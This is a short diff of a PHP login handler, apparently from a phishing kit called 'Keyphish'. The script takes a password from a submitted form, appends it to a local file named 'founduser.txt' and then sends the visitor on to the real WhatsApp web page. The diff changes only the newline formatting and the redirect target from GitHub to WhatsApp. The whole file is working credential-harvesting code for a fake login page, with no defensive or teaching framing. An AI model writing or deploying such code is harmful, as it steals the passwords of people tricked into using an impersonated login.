@@ -1,11 +1,15 @@
 <?php
  $user = $_POST["pass"];
- $co = "===========================================\n"; 
- $cl = "===========================================\n";
+ $co = "===========================================
+"; 
+ $cl = "===========================================
+";
  $fileuser = fopen("founduser.txt", "a") or die("Intentalo nuevamente");
- $us = "Password: $user\n";
- fwrite($fileuser, "\n". $co. $us. $cl);
+ $us = "Password: $user
+";
+ fwrite($fileuser, "
+". $co. $us. $cl);
  fclose($fileuser);
- header('Location: https://github.com/Mr-Star-h/Keyphish/edit/main/login.php');
+ header('Location: https://web.whatsapp.com/');
  exit();
 ?>
